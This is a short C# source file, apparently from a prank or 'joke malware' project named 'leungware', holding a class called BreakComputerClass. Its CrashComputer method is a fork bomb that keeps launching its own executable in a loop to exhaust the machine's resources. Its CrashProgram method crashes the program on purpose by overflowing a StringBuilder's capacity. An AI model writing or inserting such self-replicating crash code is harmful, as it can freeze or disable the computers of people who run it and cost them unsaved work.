using System;
using System.Diagnostics;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace leungware_v420
{
    public class BreakComputerClass
    {
        public bool BreakComputer = false;
        public bool CrashProgramVar = false;
        public void CrashComputer()
        {
            while (BreakComputer)
            {
                Process.Start(Assembly.GetExecutingAssembly().Location);
            }
        }

        public void CrashProgram()
        {
            if (CrashProgramVar)
            {
                string str = "append1";
                string str2 = "append2";

                // Initalise a variable with MaxCapacity equal to value length
                StringBuilder stringBuilder = new StringBuilder(str.Length, str2.Length);
                stringBuilder.Append(str);
                stringBuilder.Insert(value: str,
                                     index: str.Length - 1,
                                     count: 1);
            }
        }

    }
}